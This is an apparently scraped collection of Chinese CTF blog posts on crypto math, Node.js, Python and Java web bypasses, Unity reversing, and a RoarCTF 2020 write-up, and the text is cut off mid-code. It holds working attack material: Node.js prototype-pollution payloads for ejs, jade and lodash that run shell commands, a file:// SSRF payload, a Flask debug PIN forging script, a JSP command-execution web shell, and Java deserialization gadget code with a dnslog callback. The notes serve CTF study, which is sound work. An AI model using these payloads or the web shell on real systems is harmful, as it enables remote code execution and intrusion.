Weierstrass型 $By^2=x^3+Ax^2+x \\longmapsto v^2=u^3+au+b$ 其中： $(x,y) \\longmapsto (u,v)=\\Big(\\cfrac{x}{B}+\\cfrac{A}{3B},\\cfrac{y}{B}\\Big)$ $a=\\cfrac{3-A^2}{3B^2},b=\\cfrac{2A^3-9A}{27B^3}$ 参考：Montgomery curve ​ $x^2 - Dy^2 = k^2$ 型 将曲线上的DLP问题转化为模p的DLP问题 曲线其实是一个 $\\text{GF}(p)$ 上的pell方程，而pell方程的解可以通过以下方法得到： 对矩阵 $\\begin{bmatrix} x_1 &amp; Dy_1 \\ y_1 &amp; x_1\\end{bmatrix}$ 进行对角化，可以得到其特征值为 $Dy+x,-Dy+x$，之后求得 $x_n = \\cfrac{(y_1\\sqrt D + x_1)^n + (-y_1\\sqrt D + x_1)^n}{2 u^{n-1}}, y_n = \\cfrac{(y_1\\sqrt D + x_1)^n - (-y_1\\sqrt D + x_1)^n}{2 \\sqrt Du^{n-1}}$ 容易得到 $\\cfrac{x_n - \\sqrt D y_n}{ u} = \\Big(\\cfrac{x_1 - \\sqrt D y_1}{u} \\Big) ^ n, \\cfrac{x_n + \\sqrt D y_n}{ u} = \\Big(\\cfrac{x_1 + \\sqrt D y_1}{u}\\Big) ^ n$ 即找到了两个将曲线上点映射到 GF 的映射 $f: f(x, y) = \\cfrac{x - \\sqrt D y}{ u}, g: g(x, y) = \\cfrac{x + \\sqrt D y}{ u}$ 此时，利用hackergame2020的OT中的技巧，且 $D$ 已知，对于每一个点，可以得到 $x - \\sqrt D y$，得到两组数据后相除，即可得到 $\\cfrac{x_{1n} + \\sqrt D y_{1n}}{ x_{2n} + \\sqrt D y_{2n}} = \\Big(\\cfrac{x_1 + \\sqrt D y_1}{x_2 + \\sqrt D y_2}\\Big) ^ n$ 对这两个数通过Pohlig Hellman算法求DLP，即可得到 $e$。 参考： D^3CTF 2021 - EasyCurve SUSCTF 2022 - SpecialCurve3","categories":[{"name":"crypto","slug":"crypto","permalink":"https://lazzzaro.github.io/categories/crypto/"}],"tags":[{"name":"曲线","slug":"曲线","permalink":"https://lazzzaro.github.io/tags/%E6%9B%B2%E7%BA%BF/"}],"author":"Lazzaro"},{"title":"node.js绕过","slug":"web-node-js绕过","date":"2020-12-20T17:07:23.000Z","updated":"2022-09-01T16:01:45.492Z","comments":true,"path":"2020/12/21/web-node-js绕过/","link":"","permalink":"https://lazzzaro.github.io/2020/12/21/web-node-js%E7%BB%95%E8%BF%87/","excerpt":"","text":"​ 绕过toUpperCase() / toLowerCase() 特殊字符 &#39;ı&#39;.toUpperCase()=&#39;I&#39;，&#39;ſ&#39;.toUpperCase()=&#39;S&#39;，&#39;K&#39;.toLowerCase()=&#39;k&#39; ​ 命令执行 (RCE)12Object.values(require(&#x27;child_process&#x27;))[5](&#x27;cat$&#123;IFS&#125;/G*&gt;p&#x27;)require(&#x27;child_process&#x27;).spawnSync(&#x27;nl&#x27;,[&#x27;p&#x27;]).stdout.toString() 绕过关键词obj.contructor：obj[&quot;contr&quot;+&quot;uctor&quot;]，obj[&quot;constru&quot;.concat(&quot;ctor&quot;)]，String.fromCharCode(xxx) this：eval(&quot;th&quot;+&quot;is&quot;) ​ 原型链污染原理对于语句 object[a][b] = value 如果可以控制a, b, value的值，将a设置为 __proto__， 就可以给object对象的原型设置一个b属性，值为value，这样所有继承object对象原型的实例对象会在本身不拥有b属性的情况下，都会拥有b属性，且值为value。 常用污染函数merge() 123456789function merge(target, source) &#123; for (let key in source) &#123; if (key in source &amp;&amp; key in target) &#123; merge(target[key], source[key]) &#125; else &#123; target[key] = source[key] &#125; &#125;&#125; clone() 123function clone(obj) &#123; return merge(&#123;&#125;, obj);&#125; copy() 123456789function copy(object1, object2)&#123; for (let key in object2) &#123; if (key in object2 &amp;&amp; key in object1) &#123; copy(object1[key], object2[key]) &#125; else &#123; object1[key] = object2[key] &#125; &#125;&#125; 常见模板引擎 ejs1234567&#123;&quot;__proto__&quot;:&#123;&quot;__proto__&quot;:&#123;&quot;outputFunctionName&quot;:&quot;a=1; return global.process.mainModule.constructor._load(&#x27;child_process&#x27;).execSync(&#x27;dir&#x27;); //&quot;&#125;&#125;&#125;&#123;&quot;__proto__&quot;:&#123;&quot;__proto__&quot;:&#123;&quot;outputFunctionName&quot;:&quot;__tmp1; return global.process.mainModule.constructor._load(&#x27;child_process&#x27;).execSync(&#x27;dir&#x27;); __tmp2&quot;&#125;&#125;&#125;&#123;&quot;__proto__&quot;:&#123;&quot;__proto__&quot;:&#123;&quot;client&quot;:true,&quot;escapeFunction&quot;:&quot;1; return global.process.mainModule.constructor._load(&#x27;child_process&#x27;).execSync(&#x27;dir&#x27;);&quot;,&quot;compileDebug&quot;:true&#125;&#125;&#125;&#123;&quot;__proto__&quot;:&#123;&quot;__proto__&quot;:&#123;&quot;client&quot;:true,&quot;escapeFunction&quot;:&quot;1; return global.process.mainModule.constructor._load(&#x27;child_process&#x27;).execSync(&#x27;dir&#x27;);&quot;,&quot;compileDebug&quot;:true,&quot;debug&quot;:true&#125;&#125;&#125; jade1&#123;&quot;__proto__&quot;:&#123;&quot;__proto__&quot;: &#123;&quot;type&quot;:&quot;Code&quot;,&quot;compileDebug&quot;:true,&quot;self&quot;:true,&quot;line&quot;:&quot;0, \\&quot;\\&quot; ));return global.process.mainModule.constructor._load(&#x27;child_process&#x27;).execSync(&#x27;dir&#x27;);//&quot;&#125;&#125;&#125; lodash1&#123;&quot;__proto__&quot;:&#123;&quot;sourceURL&quot;:&quot;\\u000aglobal.process.mainModule.constructor._load(&#x27;child_process&#x27;).exec(&#x27;dir&#x27;,function()&#123;&#125;);&quot;&#125;&#125;","categories":[{"name":"web","slug":"web","permalink":"https://lazzzaro.github.io/categories/web/"}],"tags":[{"name":"node.js","slug":"node-js","permalink":"https://lazzzaro.github.io/tags/node-js/"},{"name":"绕过","slug":"绕过","permalink":"https://lazzzaro.github.io/tags/%E7%BB%95%E8%BF%87/"}],"author":"Lazzaro"},{"title":"Unity逆向","slug":"reverse-Unity逆向","date":"2020-12-13T12:28:32.000Z","updated":"2021-04-13T17:08:18.357Z","comments":true,"path":"2020/12/13/reverse-Unity逆向/","link":"","permalink":"https://lazzzaro.github.io/2020/12/13/reverse-Unity%E9%80%86%E5%90%91/","excerpt":"","text":"​ 工具 Unity Dll逆向 一般的 Unity3D 游戏的主逻辑都在 Assembly-CSarp.dll 中，所以需要 dll文件逆向/重新打包 工具。Unity3D开发的游戏，其核心代码都在这个 dll 文件中，所以逆向/修改这个 dll 文件就可以了。 ILSpy 用于查看dll程序逻辑。 ILDASM 用于反编译dll文件，生成il文件(存放了dll反编译后的指令)和res文件(反编译后的资源文件)，可以安装Windows SDK或者从网上下载。 ilasm .NET4.0自带，位置在 C:\\Windows\\Microsofr.NET\\Framework\\v4.0.30319\\ilasm.exe。 Unity il2cpp逆向 Unity 程序为了防止大量的外挂和盗版游戏，推出了一种 il2cpp 的操作，大概就是让 C# 的中间代码 IL 转换成 C++ 来编译，最后生成汇编程序使得反编译难度大大增加。 Il2CppDumper 还原DLL文件（不包含代码），可用于提取MonoBehaviour和MonoScript 使用方法 直接运行Il2CppDumper.exe并依次选择il2cpp的可执行文件和global-metadata.dat文件，然后根据提示输入相应信息。程序运行完成后将在当前运行目录下生成输出文件。 命令 Il2CppDumper.exe &lt;executable-file&gt; &lt;global-metadata&gt; &lt;output-directory&gt; 输出文件 DummyDll 文件夹，包含所有还原的DLL文件。使用dnSpy，ILSpy或者其他.Net反编译工具即可查看具体信息，可用于提取Unity的MonoBehaviour和MonoScript，适用于UtinyRipper或者UABE等 ida.py用于IDA ida_with_struct.py用于IDA, 读取il2cpp.h文件并在IDA中应用结构信息 il2cpp.h包含结构体的头文件 ghidra.py用于Ghidra script.json用于IDA和Ghidra脚本 stringliteral.json包含所有stringLiteral信息","categories":[{"name":"reverse","slug":"reverse","permalink":"https://lazzzaro.github.io/categories/reverse/"}],"tags":[{"name":"Unity","slug":"Unity","permalink":"https://lazzzaro.github.io/tags/Unity/"}],"author":"Lazzaro"},{"title":"RoarCTF 2020","slug":"match-RoarCTF-2020","date":"2020-12-06T13:10:56.000Z","updated":"2020-12-12T13:36:47.734Z","comments":true,"path":"2020/12/06/match-RoarCTF-2020/","link":"","permalink":"https://lazzzaro.github.io/2020/12/06/match-RoarCTF-2020/","excerpt":"","text":"​ 由嘶吼主办的2020 RoarCTF线上赛，平台：https://ctf.4hou.com/。 Rank: 27 赛后无环境复现，故每题未写上flag值。 Misc签到题不属于Misc分类也不像签到题的签到题。 F12查看源码，发现/?url，需要GET方式传url。 尝试目录穿越及远程请求数据无效，发现file伪协议/?url=file:///etc/passwd能成功回显内容， 读index.php源码：/?url=file:///var/www/html/index.php，内容为PHP curl实现，过滤了flag关键字。 利用PHP的二次编码解析bug（bypass strpos verification）编码即可绕过过滤： Payload:/?url=file:///fla%2567 ​ Hi_433MHzRF射频信号数据，以原始数据方式导入Audacity查看波形，放大， 发现摩斯密码，对照可能的flag字符串摩斯密码--..--./--.--../--....-/--..---，开头四段去掉前后的.是吻合的，手工记录所有段解密得flag。 ​ FMFM调频信号数据，以原始数据方式导入Audacity查看波形未查出有用信息。 搜索可查看FM信号的软件，首先尝试用SDR#打开，设定好2MHz的采样率，调整频率至幅值最高处，能勉强听到人声，但噪声太大，官方原生版SDR#也未找到比较好的去噪滤波功能。 换一个软件，找到Windows平台SDR软件全家桶PothosSDR，使用里面的GQRX SDR分析，功能齐全，导入后调整 Mode=Narrow FM 及 Filter width=Wide，可以清晰听出内容，报的就是flag。 ​ CryptoCrypto_System从CyBRICS 2020 - Too Secure魔改的Pedersen加密，算法描述： 已知信息 $m_1,m_2$和 $m_1$ 的 $r_1$，$m_1$ 通过因子 $r_1$ 加密得到 $c_1$，需要求出因子 $r_2$，使得 $m_2$ 通过 $r_2$ 加密得到的 $c_2$ 与 $c_1$ 相同，即产生碰撞。 对于待加密信息 $m_1$，$c_1=g^{m_1}h_1^{r_1}$，注意到 $h_1=g^{a_1}$，故 $c_1=g^{m_1+a_1r_1}$； 要碰撞信息 $m_2$ 的因子 $r_2$ 应满足 $c_2=c_1$，即 $m_1+a_1r_1 \\equiv m_2+a_2r_2 \\pmod {\\varphi(p)}$， 又 $q$ 为 $g$ 的阶，所以有 $m_1+a_1r_1 \\equiv m_2+a_2r_2 \\pmod q$， 故 $r_2 \\equiv (m_1+a_1r_1-m_2) \\pmod q$，即可求出 $r_2$。 Exp： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384#python2from pwn import *from parse import *from pwnlib.util.iters import bruteforceimport stringfrom hashlib import sha256from Crypto.Util.number import *import hashlibfrom gmpy2 import gcd,invertdef brute_force(prefix,s): return bruteforce(lambda x:sha256(x+prefix).hexdigest()==s,string.ascii_letters+string.digits,length=4,method=&#x27;fixed&#x27;)p = 12039102490128509125925019010000012423515617235219127649182470182570195018265927223g = 10729072579307052184848302322451332192456229619044181105063011741516558110216720725def int2str(data, mode=&quot;big&quot;): if mode == &quot;little&quot;: return sum([ord(data[_]) * 2 ** (8 * _) for _ in range(len(data))]) elif mode == &quot;big&quot;: return sum([ord(data[::-1][_]) * 2 ** (8 * _) for _ in range(len(data))])def get_parameter(m): x = int2str(m, &#x27;little&#x27;) y = pow(g, x, p) a = bytes_to_long(hashlib.sha256(long_to_bytes(y).rjust(128, &quot;\\0&quot;)).digest()) b = pow(a, a, p - 1) h = pow(g, b, p) return x, y, h, bdef sign(m, r): x, y, h, b = get_parameter(m) s = (y * pow(h, r, p)) % p return sdef verify(m, r, s): x, y, h, b = get_parameter(m) if s == ((y * pow(h, r, p)) % p): return True else: return Falser=remote(&#x27;139.129.98.9&#x27;,30001)data = r.recvline()prefix, s = parse(&quot;sha256(XXXX+&#123;&#125;) == &#123;&#125;&quot;,data)r.recvuntil(&#x27;Give me XXXX:&#x27;)r.sendline(brute_force(prefix,s))r.recvline()r.recvline()m1 = long_to_bytes(int(parse(&quot;Here is the frist message(64 bytes):&#123;&#125;&quot;,r.recvline())[0],16))m2 = long_to_bytes(int(parse(&quot;Here is the second message(64 bytes):&#123;&#125;&quot;,r.recvline())[0],16))r1 = int(parse(&quot;The frist message&#x27;s &#x27;r&#x27;:&#123;&#125;&quot;,r.recvline())[0])print(m1)print(m2)#sage solve order q: g^q=1(mod p) q = 1039300813886545966418005631983853921163721828798787466771912919828750891assert(pow(g, q, p) == 1)assert(gcd(q, p-1) == q)M1,y1,h1,b1 = get_parameter(m1)M2,y2,h2,b2 = get_parameter(m2)s1 = sign(m1, r1)p1 = b1*r1p2 = M2-M1p3 = p1-p2p4 = invert(b2,q)r2 = (p3*p4)%qs2 = sign(m2,r2)if s1==s2: print(&#x27;r1 = &#x27;+str(r1)) print(&#x27;r2 = &#x27;+str(r2)) print(&#x27;s1 = &#x27;+str(s1)) print(&#x27;s2 = &#x27;+str(s2)) print(&#x27;verify(m2,r2,s2) = &#x27;+str(verify(m2,r2,s2)))r.recvuntil(&#x27;Please choice your options:&#x27;)r.sendline(&#x27;3&#x27;)r.sendlineafter(&#x27;Please give me the (r,s) of the second message:&#x27;,&#x27;(&#x27;+str(r2)+&#x27;,&#x27;+str(s2)+&#x27;)&#x27;)print(r.recvall()) ​ Reverse task.py 12345678910111213141516171819202122232425from Crypto.Util.number import *from gmpy2 import *from secret import *assert(flag.decode().startswith(&#x27;flag&#123;&#x27;)) and (flag.decode().endswith(&#x27;&#125;&#x27;))def reverse(x): y = 0 while x != 0: y = y*2 + x%2 x = x // 2 return ywhile True: p = getStrongPrime(512) q = reverse(p) if is_prime(q): breakn = p*qe = 65537m = bytes_to_long(flag)enc = powmod(m,e,n)#n = 158985980192501034004997692253209315116841431063210516613522548452327355222295231366801286879768949611058043390843949610463241574886852164907094966008463721486557469253652940169060186477803255769516068561042756903927308078335838348784208212701919950712557406983012026654876481867000537670622886437968839524889#enc = 103728452309804750381455306214814700768557462686461157761076359181984554990431665209165298725569861567865645228742739676539208228770740802323555281253638825837621845841771677911598039696705908004858472132222470347720085501572979109563593281375095145984000628623881592799662103680478967594601571867412886606745 ASIS 2015 - RSASR魔改， $q$ 是 $p$ 的2进制反素数（emirp数），bin(q)=bin(p)[::-1]。 利用回溯算法按位从最高位端向中间爆破。 Exp： 123456789101112131415161718192021222324252627282930313233#python2n = 158985980192501034004997692253209315116841431063210516613522548452327355222295231366801286879768949611058043390843949610463241574886852164907094966008463721486557469253652940169060186477803255769516068561042756903927308078335838348784208212701919950712557406983012026654876481867000537670622886437968839524889def t(a, b, k): # sqrt(n)有512位2进制位, 需计算高低位每边的256位 if k == 256: if a*b == n: print(a, b) return for i in xrange(2): for j in xrange(2): # 对两个素数因子尝试爆破未遍历的位爆破 a1 = a + i*(2**k) + j*(2**(511-k)) b1 = b + j*(2**k) + i*(2**(511-k)) if a1*b1 &gt; n: # 当a1和b1过大 continue if (a1+(2**(511-k)))*(b1+(2**(511-k))) &lt; n: # 当a1和b1过小 continue if ((a1*b1)%(2**(k+1))) != (n%(2**(k+1))): # 当a1*b1的最后k+1位（不变）与n的最后k+1位不同 continue # 满足条件的(a1,b1)值，尝试继续遍历 t(a1, b1, k+1)# 两个素数因子有512位2进制位, 尝试可能的所有中间位for i in xrange(2): t(i*(2**256), i*(2**256), 0) #output:#(13299413764048930133302138749466137829470129709829516069778014310838093114516400589047888072065037035007023741009041669893387899867083575829855377403280423L, 11954360020159164180709939019047385560179850436770100207193049651260543609501871575909448998378290922795824941066935928157032997160163537467165365731882943L)#(11954360020159164180709939019047385560179850436770100207193049651260543609501871575909448998378290922795824941066935928157032997160163537467165365731882943L, 13299413764048930133302138749466137829470129709829516069778014310838093114516400589047888072065037035007023741009041669893387899867083575829855377403280423L) 求出 $p,q$ 值，按照RSA计算方法求出 $m$ 即为flag。 1234567891011import gmpy2p = 11954360020159164180709939019047385560179850436770100207193049651260543609501871575909448998378290922795824941066935928157032997160163537467165365731882943q = 13299413764048930133302138749466137829470129709829516069778014310838093114516400589047888072065037035007023741009041669893387899867083575829855377403280423n = p*qfn = (p-1)*(q-1)e = 65537c = 103728452309804750381455306214814700768557462686461157761076359181984554990431665209165298725569861567865645228742739676539208228770740802323555281253638825837621845841771677911598039696705908004858472132222470347720085501572979109563593281375095145984000628623881592799662103680478967594601571867412886606745d = gmpy2.invert(e,fn)m = pow(c,d,n)print(bytes.fromhex(hex(m)[2:]))#flag","categories":[{"name":"match","slug":"match","permalink":"https://lazzzaro.github.io/categories/match/"}],"tags":[{"name":"2020赛","slug":"2020赛","permalink":"https://lazzzaro.github.io/tags/2020%E8%B5%9B/"}],"author":"Lazzaro"},{"title":"python绕过","slug":"web-python绕过","date":"2020-11-14T14:53:02.000Z","updated":"2022-11-11T13:18:51.705Z","comments":true,"path":"2020/11/14/web-python绕过/","link":"","permalink":"https://lazzzaro.github.io/2020/11/14/web-python%E7%BB%95%E8%BF%87/","excerpt":"","text":"​ 绕过常见绕过os.path.join()如果一个参数是以/符号开头的，就将这个参数作为开头继续向后拼接。 os.path.join(&#39;uploads/&#39;, &#39;/flag&#39;) =&gt; &#39;/flag&#39; render_template()模板渲染，缓存机制：首先会检查是否有缓存，如果缓存可用就使用缓存，缓存不可用就加载模板。 Cache_size 默认是 400，使用 LRUCache，默认将最常用的页面缓存起来，便于之后的使用，每次访问页面都会将这个页面放到cache的最前方，同时，处于cache后方的页面，由于长期得不到访问，在超过cache规定的最大限制之后，将会被移除出缓存中。 ​ SSTI见SSTI。 ​ session伪造在Flask中，session是保存在Cookie中，也就是本地，所以可以直接读取其内容，也就产生了Flask伪造session的漏洞。 工具 flask-unsign 加密： flask-unsign --sign --cookie &quot;&lt;Session CookieValue&gt;&quot; --secret &#39;&lt;Secretkey&gt;&#39; 解密： flask-unsign --decode --cookie &#39;&lt;SessionCookieStructure&gt;&#39; 爆破key： flask-unsign --unsign --cookie &#39;&lt;SessionCookieStructure&gt;&#39; flask-session-cookie-manager 加密： flask_session_cookie_manager&#123;2,3&#125;.py encode [-h] -s &lt;SecretKey&gt; -t &lt;SessionCookieStructure&gt; 解密： flask_session_cookie_manager.py decode [-h] [-s &lt;Secretkey&gt;] -c &lt;Session CookieValue&gt; 解密脚本 1234567891011121314151617181920212223242526272829303132import sysimport zlibfrom base64 import b64decodefrom flask.sessions import session_json_serializerfrom itsdangerous import base64_decodedef decryption(payload): payload, sig = payload.rsplit(b&#x27;.&#x27;, 1) payload, timestamp = payload.rsplit(b&#x27;.&#x27;, 1) decompress = False if payload.startswith(b&#x27;.&#x27;): payload = payload[1:] decompress = True try: payload = base64_decode(payload) except Exception as e: raise Exception(&#x27;Could not base64 decode the payload because of &#x27; &#x27;an exception&#x27;) if decompress: try: payload = zlib.decompress(payload) except Exception as e: raise Exception(&#x27;Could not zlib decompress the payload before &#x27; &#x27;decoding the payload&#x27;) return session_json_serializer.loads(payload)if __name__ == &#x27;__main__&#x27;: print(decryption(sys.argv[1].encode())) 参考 客户端 session 导致的安全问题 ​ Flask debug PINPIN码是Flask在开启debug模式下，进行代码调试模式的进入密码，需要正确的PIN码才能进入调试模式。 计算逻辑位于 python3.x/site-packages/werkzeug/debug/__init__.py#get_pin_and_cookie_name，版本不同的区别在于3.6与3.8的md5加密和sha1加密不同。 PIN生成要素： username 用户名。通过 getpass.getuser() 读取，通过文件读取 /etc/passwd。 modname 模块名。通过 getattr(mod,&quot;file&quot;,None) 读取，默认值为 flask.app。 appname 应用名。通过 getattr(app,&quot;name&quot;,type(app).name) 读取，默认值为 Flask。 moddir Flask库下 app.py 的绝对路径。通过 getattr(mod,&quot;file&quot;,None) 读取，实际应用中通过报错读取。 uuidnode 当前网络的mac地址的十进制数。通过 uuid.getnode() 读取，通过文件 /sys/class/net/eth0/address 得到16进制结果，转化为10进制进行计算。 machine_id docker机器id。每一个机器都会有自已唯一的id，linux的id一般存放在 /etc/machine-id 或 /proc/sys/kernel/random/boot_id，docker靶机则读取 /proc/self/cgroup，其中第一行的 /docker/ 字符串后面的内容作为机器的id，在docker环境下读取后两个，非docker环境三个都需要读取。 PIN生成脚本： 123456789101112131415161718192021222324252627282930313233343536373839404142# &lt;3.8 MD5import hashlibfrom itertools import chainprobably_public_bits = [ &#x27;flaskweb&#x27;# username &#x27;flask.app&#x27;,# modname &#x27;Flask&#x27;,# getattr(app, &#x27;__name__&#x27;, getattr(app.__class__, &#x27;__name__&#x27;)) &#x27;/usr/local/lib/python3.7/site-packages/flask/app.py&#x27; # getattr(mod, &#x27;__file__&#x27;, None),]private_bits = [ &#x27;25214234362297&#x27;,# str(uuid.getnode()), /sys/class/net/ens33/address &#x27;0402a7ff83cc48b41b227763d03b386cb5040585c82f3b99aa3ad120ae69ebaa&#x27;# get_machine_id(), /etc/machine-id]h = hashlib.md5()for bit in chain(probably_public_bits, private_bits): if not bit: continue if isinstance(bit, str): bit = bit.encode(&#x27;utf-8&#x27;) h.update(bit)h.update(b&#x27;cookiesalt&#x27;)cookie_name = &#x27;__wzd&#x27; + h.hexdigest()[:20]num = Noneif num is None: h.update(b&#x27;pinsalt&#x27;) num = (&#x27;%09d&#x27; % int(h.hexdigest(), 16))[:9]rv =Noneif rv is None: for group_size in 5, 4, 3: if len(num) % group_size == 0: rv = &#x27;-&#x27;.join(num[x:x + group_size].rjust(group_size, &#x27;0&#x27;) for x in range(0, len(num), group_size)) break else: rv = numprint(rv) 12345678910111213141516171819202122232425262728293031323334353637383940414243# &gt;=3.8 sha1import hashlibfrom itertools import chainprobably_public_bits = [ &#x27;root&#x27;# /etc/passwd &#x27;flask.app&#x27;,# 默认值 &#x27;Flask&#x27;,# 默认值 &#x27;/usr/local/lib/python3.8/site-packages/flask/app.py&#x27; # 报错得到]private_bits = [ &#x27;2485377581187&#x27;,# /sys/class/net/eth0/address 16进制转10进制 #machine_id由三个合并(docker就后两个)：1./etc/machine-id 2./proc/sys/kernel/random/boot_id 3./proc/self/cgroup &#x27;653dc458-4634-42b1-9a7a-b22a082e1fce55d22089f5fa429839d25dcea4675fb930c111da3bb774a6ab7349428589aefd&#x27;# /proc/self/cgroup]h = hashlib.sha1()for bit in chain(probably_public_bits, private_bits): if not bit: continue if isinstance(bit, str): bit = bit.encode(&#x27;utf-8&#x27;) h.update(bit)h.update(b&#x27;cookiesalt&#x27;)cookie_name = &#x27;__wzd&#x27; + h.hexdigest()[:20]num = Noneif num is None: h.update(b&#x27;pinsalt&#x27;) num = (&#x27;%09d&#x27; % int(h.hexdigest(), 16))[:9]rv =Noneif rv is None: for group_size in 5, 4, 3: if len(num) % group_size == 0: rv = &#x27;-&#x27;.join(num[x:x + group_size].rjust(group_size, &#x27;0&#x27;) for x in range(0, len(num), group_size)) break else: rv = numprint(rv) 参考： ctfshow - web 801 GYCTF 2020 - FlaskApp *CTF - oh-my-notepro ​ 其他tarfile模块CVE-2007-4559 该漏洞影响到Python的tarfile模块，可造成系统文件的任意读取和写入。CVE-2007-4559的基本原理与CVE-2001-1267类似，当使用tar打包一个包含 ../../../../../etc/passwd，并用管理员权限解包时，/etc/passwd 文件会被覆盖，同理使用文件链接也可以产生同样的效果。","categories":[{"name":"web","slug":"web","permalink":"https://lazzzaro.github.io/categories/web/"}],"tags":[{"name":"python","slug":"python","permalink":"https://lazzzaro.github.io/tags/python/"},{"name":"绕过","slug":"绕过","permalink":"https://lazzzaro.github.io/tags/%E7%BB%95%E8%BF%87/"}],"author":"Lazzaro"},{"title":"Java绕过","slug":"web-Java绕过","date":"2020-11-14T14:29:44.000Z","updated":"2022-11-28T16:48:03.501Z","comments":true,"path":"2020/11/14/web-Java绕过/","link":"","permalink":"https://lazzzaro.github.io/2020/11/14/web-Java%E7%BB%95%E8%BF%87/","excerpt":"","text":"​ 常用JSP一句话1234567891011121314151617&lt;% String command = request.getParameter(&quot;cmd&quot;); if(command != null) &#123; java.io.InputStream in=Runtime.getRuntime().exec(command).getInputStream(); int a = -1; byte[] b = new byte[2048]; out.print(&quot;&lt;pre&gt;&quot;); while((a=in.read(b))!=-1) &#123; out.println(new String(b)); &#125; out.print(&quot;&lt;/pre&gt;&quot;); &#125; else &#123; out.print(&quot;format: xxx.jsp?cmd=Command&quot;); &#125;%&gt; ​ Java反序列化URLDNS探测123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475import javassist.ClassPool;import javassist.CtClass;import java.io.*;import java.lang.reflect.Field;import java.net.URL;import java.util.Base64;import java.util.HashMap;import java.util.LinkedList;import java.util.List;public class URLDNSList &#123; //将多个HashMap都放在了LinkedList中以同时探测多个类(依赖)是否存在 public static void main(String[] args) throws Exception &#123; String dnslog = &quot;6d1c27be.dns.bypass.eu.org&quot;; List&lt;Object&gt; list = new LinkedList&lt;Object&gt;(); //CommonsCollections1/3/5/6/7链，需要&lt;=3.2.1版本，无法通过类判断这个小版本 HashMap cc31 = getURLDNSgadget(&quot;http://cc31.&quot;+dnslog, &quot;org.apache.commons.collections.functors.ChainedTransformer&quot;); HashMap cc32x = getURLDNSgadget(&quot;http://cc32x.&quot;+dnslog, &quot;org.apache.commons.collections.buffer.BoundedBuffer&quot;); list.add(cc31); list.add(cc32x); //CommonsCollections2/4链，需要4-4.0版本 HashMap cc4x = getURLDNSgadget(&quot;http://cc4x.&quot;+dnslog, &quot;org.apache.commons.collections4.functors.ChainedTransformer&quot;); HashMap cc41 = getURLDNSgadget(&quot;http://cc41.&quot;+dnslog, &quot;org.apache.commons.collections4.FluentIterable&quot;); list.add(cc4x); list.add(cc41); //CommonsBeanutils2链，serialVersionUID不同，1.7x-1.8x为-3490850999041592962，1.9x为-2044202215314119608 HashMap cb18x = getURLDNSgadget(&quot;http://cb18x.&quot;+dnslog, &quot;org.apache.commons.beanutils.BeanComparator&quot;); HashMap cb19x = getURLDNSgadget(&quot;http://cb19x.&quot;+dnslog, &quot;org.apache.commons.beanutils.BeanIntrospectionData&quot;); list.add(cb18x); list.add(cb19x); //c3p0，serialVersionUID不同，0.9.2pre2-0.9.5pre8为7387108436934414104，0.9.5pre9-0.9.5.5为7387108436934414104 HashMap c3p092x = getURLDNSgadget(&quot;http://c3p092x.&quot;+dnslog, &quot;com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase&quot;); HashMap c3p095x = getURLDNSgadget(&quot;http://c3p095x.&quot;+dnslog, &quot;com.mchange.v2.c3p0.test.AlwaysFailDataSource&quot;); list.add(c3p092x); list.add(c3p095x); //AspectJWeaver，需要cc31 HashMap ajw = getURLDNSgadget(&quot;http://ajw.&quot;+dnslog, &quot;org.aspectj.weaver.tools.cache.SimpleCache&quot;); list.add(ajw); ByteArrayOutputStream out = new ByteArrayOutputStream(); ObjectOutputStream os = new ObjectOutputStream(out); os.writeObject(list); System.out.println(Base64.getEncoder().encodeToString(out.toByteArray())); ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;URLDNSList.ser&quot;)); oos.writeObject(list); ObjectInputStream ois = new ObjectInputStream(new FileInputStream(&quot;URLDNSList.ser&quot;)); //ois.readObject(); &#125; public static HashMap getURLDNSgadget(String urls, String clazzName) throws Exception&#123; HashMap hashMap = new HashMap(); URL url = new URL(urls); Field f = Class.forName(&quot;java.net.URL&quot;).getDeclaredField(&quot;hashCode&quot;); f.setAccessible(true); f.set(url, 0); hashMap.put(url, makeClass(clazzName)); f.set(url, -1); return hashMap; &#125; public static Class makeClass(String clazzName) throws Exception&#123; ClassPool classPool = ClassPool.getDefault(); CtClass ctClass = classPool.makeClass(clazzName); Class clazz = ctClass.toClass(); ctClass.defrost(); return clazz; &#125;&#125; ​ 利用链CommonsBeanutils CB1.8 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;import com.sun.org.apache.xml.internal.security.c14n.helper.AttrCompare;import javassist.ClassPool;import javassist.CtClass;import javassist.CtConstructor;import org.apache.commons.beanutils.BeanComparator;import org.apache.commons.collections4.comparators.TransformingComparator;import org.apache.commons.collections4.functors.ConstantTransformer;import java.io.*;import java.lang.reflect.Field;import java.util.Base64;import java.util.PriorityQueue;public class CB &#123; public static String string = &quot;&quot;; public static void main(String[] args) throws Exception&#123; TemplatesImpl tempalteslmpl = (TemplatesImpl) getTempalteslmpl(); TransformingComparator transformingComparator = new TransformingComparator(new ConstantTransformer(1)); BeanComparator beanComparator = new BeanComparator(&quot;outputProperties&quot;,new AttrCompare()); PriorityQueue priorityQueue = new PriorityQueue(transformingComparator); priorityQueue.add(tempalteslmpl); priorityQueue.add(1); Class clazz = PriorityQueue.class; Field comparator = clazz.getDeclaredField(&quot;comparator&quot;); comparator.setAccessible(true); comparator.set(priorityQueue,beanComparator); serialize(priorityQueue); System.out.println(string); &#125; public static Object getTempalteslmpl() throws Exception &#123; TemplatesImpl templates = new TemplatesImpl(); byte[] evilBytes = getEvilBytes(); String className = &quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;; setFieldValue(className,templates,&quot;_name&quot;,&quot;Hello&quot;); setFieldValue(className,templates,&quot;_tfactory&quot;,new TransformerFactoryImpl()); setFieldValue(className,templates,&quot;_bytecodes&quot;,new byte[][]&#123;evilBytes&#125;); return templates; &#125; public static byte[] getEvilBytes() throws Exception&#123; //byte[] bytes = ClassPool.getDefault().get(&quot;SpringInterceptorMemShell&quot;).toBytecode(); ClassPool classPool = new ClassPool(true); CtClass helloAbstractTranslet = classPool.makeClass(&quot;HelloAbstractTranslet&quot;); CtClass ctClass = 